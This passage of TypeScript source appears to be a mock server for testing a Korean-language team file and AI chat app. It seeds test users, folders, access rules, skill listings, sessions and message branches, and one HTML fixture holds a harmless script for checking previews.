    if (o.teamLocale) this.settings.defaultLocale = o.teamLocale
    this.activeLeaf.clear()
    this.pendingAsk.clear()
    this.openAsks.clear()
    this.stopped.clear()
    this.queuePositions.clear()
    this.queueRevision = 0
    this.revoked.clear()
    this.downloadOnly.clear()
    this.connection = defaultConnection()
    if (!this.setupNeeded) this.seed()
    // two admins besides the owner and Bob: Dana (signs in) and Eve (a row an admin cannot delete)
    if (o.withAdmin && !this.setupNeeded) {
      this.addUser({ id: 'dana', username: 'dana', name: 'Dana', role: 'admin', groupIds: [], localeChoice: this.usersFollowTeam ? null : 'ko' }, 'dana password 1')
      this.addUser({ id: 'eve', username: 'eve', name: 'Eve', role: 'admin', groupIds: [], localeChoice: this.usersFollowTeam ? null : 'ko' }, 'eve password 1')
    }
    for (const u of this.users) if (u.username === o.mustChange) u.mustChangePassword = true
  }

  seed() {
    const g: Group = { id: uuidv7(), name: '재무팀', description: '재무 자료', memberIds: ['olga'] }
    this.groups = [g]
    const own = this.usersFollowTeam ? null : 'ko'
    this.addUser({ id: 'olga', username: 'olga', name: 'Olga', role: 'owner', groupIds: [g.id], localeChoice: own }, OWNER_PASSWORD)
    this.addUser({ id: 'bob', username: 'bob', name: 'Bob', role: 'member', groupIds: [], localeChoice: own }, 'bob password 1')
    for (const p of ['docs', 'finance', 'finance/2026', 'marketing', 'secret', 'users', 'users/olga']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('marketing/plan.md', '# Plan\n\n- launch\n- grow\n')
    this.putFile('marketing/data.csv', 'name,value\nalpha,1\nbeta,2\n')
    this.putFile('marketing/notes.txt', 'hello notes')
    this.putFile('finance/2026/q3.csv', 'q,amount\nq3,100\n')
    this.putFile('marketing/page.html', '<h1>Hi</h1><script>document.body.append("ran")</script>')
    this.putFile('marketing/plan (충돌 사본 - Bob 2026-10-21 10.00).md', '# Plan conflicting\n')
    for (const [p, data] of officeFixtures()) this.putFile(p, data)
    for (const p of ['skills', 'skills/재무']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('skills/team-rules.md', '# 팀 규칙\n- 금액은 원 단위로 쓴다\n')
    this.folders = [
      { id: uuidv7(), path: 'finance', exists: true, createdAt: now(), rules: [] },
    ]
    this.folders[0]!.rules = [{ id: uuidv7(), folderId: this.folders[0]!.id, subjectType: 'group', subjectId: g.id, access: 'read', updatedBy: null, updatedAt: now() }]
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 1, sha256: 'a'.repeat(64), size: 20, author: { id: 'bob', name: 'Bob' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'olga', name: 'Olga' }, savedTurnId: null })
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 2, sha256: 'b'.repeat(64), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'bob', name: 'Bob' }, savedTurnId: null })
    // a version identical to the file as it is now (after a restore): shown as "same as now", not offered
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 3, sha256: sha256Hex(this.files.get('marketing/plan.md')!.data!), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'restore', conflictPath: null, createdAt: now() })
    // finance is read-only for the owner here: versions can be downloaded, not restored
    this.versions.push({ id: uuidv7(), path: 'finance/2026/q3.csv', version: 1, sha256: 'c'.repeat(64), size: 12, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
  }

  /** like the server: people without their own language see the team default */
  syncLocales() {
    for (const u of this.users) u.locale = u.localeChoice ?? this.settings.defaultLocale
  }

  addUser(u: Pick<User, 'id' | 'username' | 'name' | 'role' | 'groupIds'> & { mustChangePassword?: boolean; localeChoice?: Locale | null; email?: string | null }, password: string) {
    const user: User = { email: null, status: 'active', mustChangePassword: false, locale: 'ko', localeChoice: null, createdAt: now(), lastSeenAt: null, ...u }
    user.locale = user.localeChoice ?? this.settings.defaultLocale
    this.users.push(user)
    this.passwords.set(user.username, password)
    return user
  }

  /** "name (2).ext", "name (3).ext", …: the first one not taken (onExists rename) */
  freePath(p: string): string {
    for (let i = 2; ; i++) {
      const q = p.replace(/(\.[^./]+)?$/, (ext: string) => ` (${i})${ext}`)
      if (!this.files.has(q)) return q
    }
  }

  putFile(path: string, content: string | Uint8Array) {
    const data = typeof content === 'string' ? enc.encode(content) : content
    this.files.set(path, { type: 'file', data, mtime: now() })
  }

  // ---------------- access (simplified policy) ----------------
  /** folders taken away from everyone by POST /__test/revoke (an admin's rule change) */
  revoked = new Set<string>()
  /** answers' "참고한 파일" as recorded (GET .../messages/:messageId/sources checks each against the viewer now) */
  sources = new Map<string, MessageSourceFile[]>()
  /** POST /__test/confidential {all: true}: Safe operations 1A is on (Me.server.allChatsConfidential) */
  allConfidential = false
  /** POST /__test/artifact: what the next "artifact" answer writes */
  nextArtifact: { type: 'html' | 'svg' | 'react' | 'mermaid'; content: string } | null = null
  access(path: string, user: User): 'none' | 'read' | 'write' {
    if (path === '' ) return 'write'
    if ([...this.revoked].some((r) => path === r || path.startsWith(r + '/'))) return 'none'
    if (path === 'secret' || path.startsWith('secret/')) return 'none'
    if (path.startsWith('users/')) {
      const owner = path.split('/')[1]
      return owner === user.id || user.role === 'owner' ? 'write' : 'none'
    }
    if (path === 'finance' || path.startsWith('finance/')) return user.role === 'owner' ? 'read' : 'none'
    // a skills folder only admins can read (POST /__test/skills puts skills there): members never see its skills
    if (path === 'skills/임원' || path.startsWith('skills/임원/')) return user.role === 'member' ? 'none' : 'read'
    return 'write'
  }

  entry(path: string, n: FileNode, user: User): FileEntry {
    return { name: path.slice(path.lastIndexOf('/') + 1), path, type: n.type, size: n.type === 'file' ? n.data!.byteLength : null, mtime: n.mtime, mime: n.type === 'file' ? mimeOf(path) : null, access: this.access(path, user),
      ...(n.type === 'file' && this.downloadOnly.has(path) ? { downloadOnly: true as const } : {}) }
  }
  /** POST /__test/download-only {path}: a file Safe operations 1A generated (quarantined: FileEntry.downloadOnly) */
  downloadOnly = new Set<string>()
  /** POST /__test/skill-list: what GET /api/skills/overview says of the AI's skill list (server/src/chat/skill-list.ts) */
  aiList: SkillsOverview['aiList'] = undefined

  // ---------------- folder access explained (like server/src/admin/access-explain.ts) ----------------
  // The server's own RuleSet over the folder rules of Admin › 폴더 권한 here (the file screens above keep their
  // simplified policy), and the server's own rows, order, pages and counts (server/src/admin/access-rows.ts): nothing
  // under users/ but the person's own folder, no .system/ or temp names. Group folders are groups/<group name> when
  // that folder is here; connected folders are the folders under connected/ (POST /__test/file makes either).
  explainRules() { return new RuleSet(this.folders.flatMap((f) => f.rules.map((r) => ({ path: f.path, subject_type: r.subjectType, subject_id: r.subjectId, access: r.access })))) }
  explainPrincipal(u: User) { return { id: u.id, name: u.name, role: u.role, groups: u.groupIds } }
  isFolder(p: string) { return p === '' || this.files.get(p)?.type === 'folder' || this.folders.some((f) => f.path === p) }
  explainFolder(q: { path?: string; cursor?: string; limit?: string }): FolderAccessResponse {
    const input = folderInput(q.path)
    if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? '개인 폴더(users/)는 본인만 봐요. 사람 기준으로 확인해 주세요.' : '팀 폴더 경로가 아니에요.', { 'query.path': input.detail })
    const segs = (input as { segs: string[] }).segs
    const p = segs.join('/')
    const rules = this.explainRules()
    const ruleFolder = ruleFolderOf(new Set(rules.ruleFolders()), segs)
    const at = ruleFolder === null ? segs : segsOf(ruleFolder)
    const all = this.users.filter((u) => u.status === 'active').sort(byPerson).map((u) => ({ u, ...rules.explain(this.explainPrincipal(u), at) }))
    const pg = pageByPerson(all, (r) => r.u, { cursor: q.cursor, limit: q.limit ? Number(q.limit) : undefined }) ?? fail('validation', 400, '입력값을 확인해 주세요.', { 'query.cursor': 'not a cursor of this answer' })
    const nav = rules.navigator(segs, MAX_VIA, shownPath)
    const people = pg.items.map(({ u, access, reason }) => ({ user: { id: u.id, name: u.name }, role: u.role, access, reason, ...navigation(() => nav(this.explainPrincipal(u)), access) }))
    const off = new Map<string, { folder: string; access: Access }[]>()
    for (let len = segs.length; len >= 0; len--) {
      const f = segs.slice(0, len).join('/')
      for (const r of rules.rulesAt(f)) if (r.subjectType === 'user' && r.subjectId && !this.users.some((u) => u.id === r.subjectId && u.status === 'active')) off.set(r.subjectId, [...(off.get(r.subjectId) ?? []), { folder: f, access: r.access }])
    }
    const inactive = [...off].map(([id, rs]) => {
      const u = this.users.find((x) => x.id === id)
      const e = rules.explain({ id, name: u?.name ?? id, role: u?.role ?? 'member', groups: u?.groupIds ?? [] }, at)
      return { user: { id, name: u?.name ?? id }, role: u?.role ?? 'member', access: e.access, reason: e.reason, rules: rs }
    }).sort((a, b) => byPerson(a.user, b.user))
    return { path: p, exists: p === '' || this.files.get(p)?.type === 'folder', ruleFolder, people, total: pg.total, nextCursor: pg.nextCursor, summary: summarize(all), inactive }
  }
  explainPerson(who: { user: User | null; role: User['role']; groupIds: string[] }, q: { prefix?: string; cursor?: string; limit?: number }): PersonAccessResponse {
    type Row = PersonAccessResponse['folders'][number]
    const rules = this.explainRules()
    const p = { id: who.user?.id ?? '\u0000new-person', name: who.user?.name ?? '', role: who.role, groups: who.groupIds }
    const cands = new Map<string, Pick<Row, 'path' | 'kinds' | 'group' | 'projects' | 'connected'>>()
    const add = (path: string, k: Row['kinds'][number]) => {
      if (!shownSegs(path)) return null
      const c = cands.get(path) ?? { path, kinds: [] }
      if (!c.kinds.includes(k)) c.kinds.push(k)
      cands.set(path, c)
      return c
    }
    for (const f of rules.ruleFolders()) add(f, 'rules')
    for (const [path, n] of this.files) if (n.type === 'folder' && !path.includes('/')) add(path, 'top')
    for (const g of this.groups) { const c = this.isFolder(`groups/${g.name}`) ? add(`groups/${g.name}`, 'group') : null; if (c) c.group = { id: g.id, name: g.name } }
    for (const pr of this.projects) { const c = add(pr.folderPath, 'project'); if (c) c.projects = [...(c.projects ?? []), { id: pr.id, name: pr.name }] }
    for (const [path, n] of this.files) if (n.type === 'folder' && /^connected\/[^/]+$/.test(path)) { const c = add(path, 'connected'); if (c) c.connected = { id: `connected-${path.slice(10)}`, name: path.slice(10) } }
    if (who.user) cands.set(`users/${who.user.id}`, { path: `users/${who.user.id}`, kinds: ['personal'] })
    const pg = pageByPath([...cands.values()], q)
    let listing: ReturnType<RuleSet['listing']> | undefined
    const folders = pg.items.map((c) => {
      const personal = c.kinds.includes('personal')
      const e = rules.explain(p, segsOf(c.path))
      // someone new has no users/<id> yet: it is not named, as on the server
      const look = () => { const l = (listing ??= rules.listing(p)); return who.user ? l.at(segsOf(c.path), MAX_VIA, shownPath) : withoutOwnFolder(l.at(segsOf(c.path), MAX_VIA + 1, shownPath), `users/${p.id}`, MAX_VIA) }
      return { ...c, exists: personal ? null : this.isFolder(c.path), access: e.access, reason: e.reason, ...navigation(look, e.access) }
    })
    return { user: who.user ? { id: who.user.id, name: who.user.name } : null, role: who.role, status: who.user?.status ?? null,
      groups: who.groupIds.map((id) => ({ id, name: this.groups.find((g) => g.id === id)?.name ?? id })).sort((a, b) => a.name.localeCompare(b.name)), folders, total: pg.total, nextCursor: pg.nextCursor }
  }

  /** the tree of Admin › 폴더 권한 › 폴더별 (like explainTree in server/src/admin/access-explain.ts): the folders here,
   * the same rows and order (server/src/admin/access-tree.ts) */
  explainTree(q: { path?: string; cursor?: string; limit?: string; open?: string; rules?: string }): AccessTreeResponse {
    const input = folderInput(q.path)
    if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? '개인 폴더(users/)는 본인만 봐요. 사람 기준으로 확인해 주세요.' : '팀 폴더 경로가 아니에요.', { 'query.path': input.detail })
    const segs = (input as { segs: string[] }).segs
    const p = segs.join('/')
    const sub = (s: readonly string[]) => {
      const base = s.join('/')
      const out: string[] = []
      for (const [path, n] of this.files) {
        if (n.type !== 'folder' || path === '' || path === base) continue
        const at = path.lastIndexOf('/')
        if ((at < 0 ? '' : path.slice(0, at)) === base && (s.length === 0 || shownSegs(path))) out.push(path.slice(at + 1))
      }
      return out
    }
    const marks = new Map<string, TreeMark>()
    const mark = (path: string, kind: AccessFolderKind) => { const m = marks.get(path) ?? { kinds: new Set() }; m.kinds.add(kind); marks.set(path, m); return m }
    for (const g of this.groups) if (this.isFolder(`groups/${g.name}`)) mark(`groups/${g.name}`, 'group').group = { id: g.id, name: g.name }
    for (const pr of this.projects) { const m = mark(pr.folderPath, 'project'); m.projects = [...(m.projects ?? []), { id: pr.id, name: pr.name }] }
    for (const [path, n] of this.files) if (n.type === 'folder' && /^connected\/[^/]+$/.test(path)) mark(path, 'connected').connected = { id: `connected-${path.slice(10)}`, name: path.slice(10) }
    const active = this.users.filter((u) => u.status === 'active')
    const src: TreeSource = {
      rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)),
      groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null,
      personName: (id) => this.users.find((u) => u.id === id)?.name ?? null,
      children: sub, hasFolders: (s) => sub(s).length > 0, isFolder: (s) => s.length === 0 || this.files.get(s.join('/'))?.type === 'folder', marks, personal: active.length,
    }
    const exists = p === '' || this.files.get(p)?.type === 'folder'
    const page = { cursor: q.cursor, limit: q.limit ? Number(q.limit) : undefined }
    return q.rules === '1' || q.rules === 'true' ? ruledAnswer(src, segs, exists, page) : treeAnswer(src, segs, exists, { ...page, open: q.open === '1' || q.open === 'true' })
  }

  /** the edit panel's preview (like explainEdit in server/src/admin/access-explain.ts): the server's own computation
   * (server/src/admin/access-edit.ts) over the rules and people here. A folder with a rule row as stored, any other as
   * the tree takes it; nothing in users/. Connected folders are those under connected/ here. */
  explainEdit(body: { path: string; rules: { subjectType: string; subjectId: string | null; access: Access }[] }, locale: Locale): FolderEditPreview {
    let p = body.path
    if (!this.folders.some((f) => f.path === p && !isParkedRow(f.path))) {
      const input = folderInput(p)
      if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? serverMsg('rulesInUsers', locale) : '팀 폴더 경로가 아니에요.', { 'body.path': input.detail })
      p = (input as { segs: string[] }).segs.join('/')
    }
    if (p === 'users' || p.startsWith('users/')) fail('validation', 400, serverMsg('rulesInUsers', locale), { 'body.path': 'users/ cannot carry rules' })
    for (const [i, r] of body.rules.entries()) {
      if (r.subjectType === 'group' && !this.groups.some((g) => g.id === r.subjectId)) fail('validation', 400, serverMsg('unknownGroups', locale), { [`body.rules.${i}.subjectId`]: 'unknown group' })
      if (r.subjectType === 'user' && !this.users.some((u) => u.id === r.subjectId)) fail('validation', 400, serverMsg('unknownUsers', locale), { [`body.rules.${i}.subjectId`]: 'unknown person' })
    }
    const active = this.users.filter((u) => u.status === 'active')
    const segs = segsOf(p)
    const out = editPreview(
      { rules: this.explainRules(), people: active.map((u) => this.explainPrincipal(u)), groupName: (id) => this.groups.find((g) => g.id === id)?.name ?? null, personName: (id) => this.users.find((u) => u.id === id)?.name ?? null },
      p, body.rules, { team: isTeamDefaultFolder(p, false) ? (p === 'shared' ? 'shared' : 'skills') : null },
    )
    return { path: p, exists: p === '' || this.files.get(p)?.type === 'folder', connected: segs.length >= 2 && segs[0] === 'connected' && this.files.get(`connected/${segs[1]}`)?.type === 'folder', ...out }
  }

  // ---------------- team skills (like server/src/skills/*) ----------------
  skillChange(c: SkillChange) {
    this.skillChanges.unshift(c)
    const dir = c.path.slice(0, c.path.lastIndexOf('/'))
    this.publish({ type: 'notice', data: { level: 'info', code: 'skill_changed', message: `팀 스킬이 바뀌었어요: ${c.path} (${c.actor?.name ?? ''}${c.byAi ? ', AI가 저장' : ''})`, link: `/files?path=${encodeURIComponent(dir)}&select=${encodeURIComponent(c.path)}&history=${encodeURIComponent(c.path)}` } })
  }
  /** skills folders this person may change: owner / admin everything, others their own or their group's write rules */
  managed(u: User): string[] {
    // a member manages the skills of their groups (docs/DECISIONS.md "Group skills"; the groups Admin › Groups made)
    const groups = this.groupSkillRoots(u).map((g) => g.root)
    if (u.role === 'owner' || u.role === 'admin') return ['skills', ...groups]
    return [...this.skillGrants().filter((g) => (g.subjectType === 'user' && g.subjectId === u.id) || (g.subjectType === 'group' && u.groupIds.includes(g.subjectId))).map((g) => g.path), ...groups]
  }
  /** the skills folders of the person's groups that have a folder of their own (made by Admin › Groups, "this group
   * writes"): like server/src/chat/skills.ts writableGroupSkillRoots, by group name */
  groupSkillRoots(u: User): { id: string; name: string; root: string }[] {
    return this.groups.filter((g) => u.groupIds.includes(g.id) || g.memberIds.includes(u.id))
      .flatMap((g) => { const f = this.folders.find((x) => x.groupId === g.id); return f ? [{ id: g.id, name: g.name, root: `${f.path}/skills` }] : [] })
      .sort((a, b) => a.name.toLowerCase().localeCompare(b.name.toLowerCase()))
  }
  teamLinkSkillName(path: string): string | null {
    return this.teamLinkSkill(path)?.name ?? null
  }
  /** the team skill a link names, as the owner reads it (name and title) */
  teamLinkSkill(path: string, viewer = this.users.find((u) => u.role === 'owner')!): { name: string; title: string } | null {
    const s = this.skillsFor(viewer).find((x) => x.path === path && !x.personal)
    return s ? { name: s.name, title: s.title ?? s.name } : null
  }
  teamLinkResponse(req: Request, viewer: User) {
    const l = this.teamLink
    const used = this.users.filter((u) => u.status === 'active').length
    if (!l) return { link: null, seats: { used, limit: null } }
    const named = l.skillPath ? this.teamLinkSkill(l.skillPath, viewer) : null
    const skill = l.skillPath ? { path: l.skillPath, name: named?.name ?? null, title: named?.title ?? null } : null
    // the starter's files a newcomer with the link's groups could read now (here: those that exist)
    const paths = l.starter ? l.starter.files.filter((f) => this.files.get(f)?.type === 'file') : []
    const starter = l.starter ? { kind: l.starter.kind, files: paths.length, paths } : null
    return {
      link: { id: l.id, url: `${new URL(req.url).origin}/join#t=${l.token}`, groupIds: l.groupIds, skill, starter, maxUses: l.maxUses, uses: l.uses, createdBy: l.createdBy, createdAt: l.createdAt, expiresAt: l.expiresAt, state: l.uses >= l.maxUses ? 'used_up' as const : 'active' as const },
      seats: { used, limit: null },
    }
  }
  /** a name of the team's language from a table of names per language (English for a language it lacks) */
  localized(names: Record<Locale, string>): string {
    return names[this.settings.defaultLocale as Locale] ?? names.en
  }
  /** the card the mock's draft shows for a source chat: meeting notes in a team notes folder, the company card news
   * from the team's brand folder, else a template */
  skillCard(chatId: string): { title: string; description: string; inputs: SkillInput[]; files: { path: string; latest: boolean }[]; recurring: boolean } {
    const asked = this.messages.filter((m) => m.chatId === chatId && m.role === 'user').flatMap((m) => m.attachments.map((a) => a.path ?? ''))
    const brand = asked.find((p) => /^groups\/[^/]+\/(브랜드|Brand)\//.test(p))
    if (brand) return {
      title: '홍보 카드뉴스', description: '회사 소개 자료로 카드뉴스 5장을 만들어요', recurring: false,
      inputs: [{ name: 'channel', label: '어디에 올릴까요', type: 'choice', default: 'instagram', options: [{ value: 'instagram', label: '인스타그램' }, { value: 'linkedin', label: '링크드인' }] }],
      files: [{ path: brand, latest: false }],
    }
    const notes = asked.find((p) => /\/(회의록|Meeting notes)\//.test(p))
    if (notes) return {
      title: '주간회의 할 일', description: '팀 회의록에서 사람마다 할 일을 정리해요', recurring: true,
      inputs: [{ name: 'scope', label: '누구 할 일', type: 'choice', default: 'mine', options: [{ value: 'mine', label: '내 할 일' }, { value: 'all', label: '사람별' }] }],
      files: [{ path: notes.slice(0, notes.lastIndexOf('/')), latest: true }],
    }
    return { title: '견적서 쓰기', description: '팀 양식으로 새 견적서를 만들어요', recurring: false, inputs: [], files: asked.slice(0, 1).map((p) => ({ path: p, latest: false })) }
  }
  /** like server/src/chat/skills.ts listSkills: skills/**.md and the caller's own users/<id>/skills/ with a name header,
   * only where the caller can read */
  skillsFor(u: User, shadowed = false): { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true; group?: { id: string; name: string }; shadowedBy?: { tier: 'personal' | 'group'; group?: { id: string; name: string } }; replaces?: 'team' | 'group' }[] {
    const mine = `users/${u.id}/skills/`
    // the skills of the person's groups (docs/DECISIONS.md "Group skills"): groups/<folder>/skills/, the group's folder
    // row (its path stays when the group is renamed), else groups/<name>
    const groupRoots = this.groups.filter((g) => u.groupIds.includes(g.id) || g.memberIds.includes(u.id))
      .map((g) => ({ g, root: `${this.folders.find((f) => f.groupId === g.id)?.path ?? `groups/${g.name}`}/skills/` }))
    const out: { path: string; name: string; description: string; title?: string; inputs?: SkillInput[]; personal?: true; group?: { id: string; name: string }; shadowedBy?: { tier: 'personal' | 'group'; group?: { id: string; name: string } }; replaces?: 'team' | 'group' }[] = []
    for (const [p, n] of this.files) {
      const inGroup = groupRoots.find((r) => p.startsWith(r.root))
      if (n.type !== 'file' || !p.endsWith('.md') || !(p.startsWith('skills/') || p.startsWith(mine) || inGroup) || this.access(p, u) === 'none') continue
      const head = /^---\n([\s\S]*?)\n---/.exec(dec.decode(n.data!))?.[1]
      const name = head ? /^name:\s*(.+)$/m.exec(head)?.[1]?.trim() : undefined
      if (!name) continue
      // a SKILL.md's metadata title (the name people read), as the server reads it
      const title = p.endsWith('/SKILL.md') ? /^metadata:\n(?:[ \t]+.*\n)*?[ \t]+title:[ \t]*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^(["'])(.*)\1$/, '$2') : undefined
      // its form (metadata inputs: one JSON text under "inputs: |"), as the server reads it
      const form = p.endsWith('/SKILL.md') ? /^[ \t]+inputs:[ \t]*\|\n((?:[ \t]{4,}.*\n?)+)/m.exec(head!)?.[1] : undefined
      let inputs: SkillInput[] | undefined
      try { inputs = form ? (JSON.parse(form) as SkillInput[]) : undefined } catch { inputs = undefined }
      out.push({ path: p, name, description: /^description:\s*(.+)$/m.exec(head!)?.[1]?.trim().replace(/^"(.*)"$/, '$1') ?? '', ...(title ? { title } : {}), ...(inputs?.length ? { inputs } : {}), ...(p.startsWith(mine) ? { personal: true as const } : {}), ...(inGroup ? { group: { id: inGroup.g.id, name: inGroup.g.name } } : {}) })
    }
    // one name: personal > group > team (server/src/chat/skills.ts scanSkills)
    const tier = (s: (typeof out)[number]) => (s.personal ? 0 : s.group ? 1 : 2)
    const best = new Map<string, number>()
    for (const s of out) best.set(s.name.toLowerCase(), Math.min(best.get(s.name.toLowerCase()) ?? 3, tier(s)))
    const byName = (a: (typeof out)[number], b: (typeof out)[number]) => a.name.localeCompare(b.name) || a.path.localeCompare(b.path)
    const key = (s: (typeof out)[number]) => s.name.toLowerCase()
    const kept = out.filter((s) => tier(s) === best.get(key(s))).sort(byName)
    // what a better tier replaced: `replaces` on the one that runs ("/" menu hint), the loser itself with ?shadowed=1
    const lost = out.filter((s) => tier(s) !== best.get(key(s))).sort(byName)
    const replaces = new Map<string, 'team' | 'group'>()
    const losers = lost.map((l) => {
      const winners = kept.filter((w) => key(w) === key(l))
      for (const w of winners) if (replaces.get(w.path) !== 'team') replaces.set(w.path, tier(l) === 2 ? 'team' : 'group')
      const w = winners[0]!
      return { ...l, shadowedBy: w.personal ? { tier: 'personal' as const } : { tier: 'group' as const, group: w.group } }
    })
    return [...kept.map((s) => (replaces.has(s.path) ? { ...s, replaces: replaces.get(s.path) } : s)), ...(shadowed ? losers : [])]
  }
  manages(u: User, folder: string) {
    return this.managed(u).some((m) => folder === m || folder.startsWith(m + '/'))
  }
  suggestionFor(s: SkillSuggestion, u: User): SkillSuggestion {
    return { ...s, canReview: this.manages(u, s.targetFolder) }
  }
  /** like the server (skills/managers.ts listSkillManagers): the write rules for people and groups on skills/ and its
   * folders, however they were made (the Team skills dialog or Admin › 폴더 권한), by path, kind and id */
  skillGrants(): SkillManagerGrant[] {
    const out: SkillManagerGrant[] = []
    for (const f of this.folders) {
      if (f.path !== 'skills' && !f.path.startsWith('skills/')) continue
      for (const r of f.rules) if (r.access === 'write' && (r.subjectType === 'user' || r.subjectType === 'group') && r.subjectId) out.push({ subjectType: r.subjectType, subjectId: r.subjectId, path: f.path })
    }
    const key = (g: SkillManagerGrant) => [g.path, g.subjectType, g.subjectId]
    return out.sort((a, b) => { const x = key(a), y = key(b); for (let i = 0; i < 3; i++) if (x[i] !== y[i]) return x[i]! < y[i]! ? -1 : 1; return 0 })
  }
  skillManagersResponse() {
    return { folders: ['skills', 'skills/재무'], items: this.skillGrants() }
  }

  // ---------------- realtime ----------------
  publish(ev: ServerEventInput) {
    const full = { ...ev, seq: ++this.seq, at: Date.now() }
    ServerEvent.parse(full)
    const text = JSON.stringify(full)
    this.buffer.push({ seq: full.seq, text })
    if (this.buffer.length > 5000) this.buffer.shift()
    for (const ws of this.sockets) ws.send(text)
  }

  // ---------------- helpers ----------------
  /** like server/src/admin/engine-choice.ts: owner / admins always, others as the admin allows */
  canChoose(u: User): boolean {
    if (u.role === 'owner' || u.role === 'admin') return true
    const c = this.memberChoice
    return c.mode === 'everyone' || (c.mode === 'selected' && (c.userIds.includes(u.id) || u.groupIds.some((g) => c.groupIds.includes(g))))
  }
  /** like the server: someone who may not pick naming another engine or model than they get anyway -> 403 */
  guardEngine(name: string, u: User, body: { engine?: unknown; model?: unknown }, current: { engine: string; model: string | null }) {
    if (body.engine === undefined && body.model === undefined) return
    this.engineRequests.push({ name, user: u.id, engine: body.engine, model: body.model })
    if (this.canChoose(u)) return
    if ((body.engine !== undefined && body.engine !== current.engine) || (body.model !== undefined && (body.model ?? null) !== current.model))
      fail('forbidden', 403, 'AI 엔진과 모델은 관리자가 정해요. 엔진을 고르지 말고 보내면 팀 기본 엔진으로 답해요.')
  }
  me(u: User, sid: string): Me {
    const prefs = { ...((u as User & { prefs?: Me['user']['prefs'] }).prefs ?? {}) }
    const choose = this.canChoose(u)
    if (!choose) { delete prefs.engine; delete prefs.model }
    return {
      user: { id: u.id, username: u.username, name: u.name, email: u.email, role: u.role, locale: u.localeChoice ?? this.settings.defaultLocale, localeChoice: u.localeChoice, mustChangePassword: u.mustChangePassword, prefs, canChooseEngine: choose },
      groups: this.groups.filter((g) => u.groupIds.includes(g.id)).map((g) => ({ id: g.id, name: g.name })),
      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale, browserAllowAll: this.settings.browserAllowAll, iconVersion: this.teamIcon?.version ?? null, voiceInput: (this.speechNow() === 'local' && this.speechHost.localMissing.length === 0) || (this.speechNow() === 'openrouter' && this.speechKey.set), ...(this.speechNow() === 'openrouter' && this.speechKey.set ? { voiceInputOutside: true as const } : {}), chatTrashRetentionDays: this.settings.chatTrashRetentionDays },
      session: { id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', expiresAt: new Date(Date.now() + 30 * 86400_000).toISOString(), tempLogin: u.mustChangePassword && this.tempLogins.has(u.id) },
      server: {
        version: this.serverVersion, dev: !this.cloud, deployment: this.cloud ? 'hosted' : 'self', timeZone: this.settings.timeZone,
        ...(this.allConfidential ? { allChatsConfidential: true as const } : {}),
        ...(this.devEnv ? { devEnv: true as const } : {}),
        ...(this.htmlPdf ? { htmlPdf: true as const } : {}),
        features: this.cloud
          ? { connectionChange: false, selfUpdate: false, officeUpdate: false, connectedFolders: false, apiEngineAnyUrl: false, hostDiagnostics: false, pluginFileInstall: false }
          : { connectionChange: true, selfUpdate: true, officeUpdate: false, connectedFolders: true, apiEngineAnyUrl: true, hostDiagnostics: true, pluginFileInstall: true },
      },
      passwordReset: this.resets.get(u.id) ?? null,
    }
    void sid
  }

  startSession(u: User) {
    const token = uuidv7()
    this.sessions.set(token, u.id)
    return `${DEV_SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax`
  }

  userOf(req: Request): User | null {
    const cookie = req.headers.get('cookie') ?? ''
    const m = cookie.match(new RegExp(`${DEV_SESSION_COOKIE}=([^;]+)`))
    const id = m ? this.sessions.get(m[1]!) : undefined
    return this.users.find((u) => u.id === id && u.status === 'active') ?? null
  }

  branchInfo(m: Message): Message['branch'] {
    const sibs = this.messages.filter((x) => x.chatId === m.chatId && x.parentId === m.parentId && x.role === m.role)
    return { index: sibs.findIndex((x) => x.id === m.id), count: sibs.length, siblingIds: sibs.map((x) => x.id) }
  }
  view(m: Message): Message {
    return { ...m, branch: this.branchInfo(m) }
  }
  activeLeaf = new Map<string, string>()
  path(chatId: string): Message[] {
    const leaf = this.activeLeaf.get(chatId)
    const out: Message[] = []
    let cur = leaf ? this.messages.find((m) => m.id === leaf) : undefined
    while (cur) {
      out.unshift(this.view(cur))
      const pid: string | null = cur.parentId
      cur = pid ? this.messages.find((m) => m.id === pid) : undefined
    }
    return out
  }
  newestLeafUnder(id: string): string {
    let cur = id
    for (;;) {
      const kids = this.messages.filter((m) => m.parentId === cur)
      if (!kids.length) return cur
      cur = kids[kids.length - 1]!.id
    }
  }

  message(o: Partial<Message> & Pick<Message, 'chatId' | 'role' | 'parentId'>): Message {
    const m: Message = { id: uuidv7(), author: null, content: '', attachments: [], steps: [], status: 'done', error: null, turnId: null, engine: null, model: null, files: null, usage: null, createdAt: now(), branch: { index: 0, count: 1, siblingIds: [] }, ...o }
    this.messages.push(m)
    return m
  }

  /** The edit card of a scheduled task (server/src/tools/schedules.ts scheduleCard, mode 'edit'), in Korean. */
  scheduleEditRequest(x: Schedule, b: { title: string; prompt: string; repeat: Schedule['repeat']; time: string; weekday?: number | null; day?: number | null; date?: string | null; projectId: string | null }) {
    if (x.templateId) throw new Fail('conflict', 409, '이 예약 작업은 이 방법으로 바꿀 수 없어요. 화면을 새로 고친 뒤 다시 해 주세요.', undefined, { reason: 'schedule_template' })
    const bad: Record<string, string> = {}
    if (!b.title.trim() || b.title.trim().length > 80) bad['body.title'] = '이 칸을 확인해 주세요.'
    if (b.prompt.trim().length < 3) bad['body.prompt'] = '이 칸을 확인해 주세요.'
    if (Object.keys(bad).length) fail('validation', 400, '예약 작업을 확인해 주세요. 제목은 1–80자, 지시문은 3–4,000자로 쓰고 일정(시각, 요일, 날짜)을 골라 주세요.', bad)
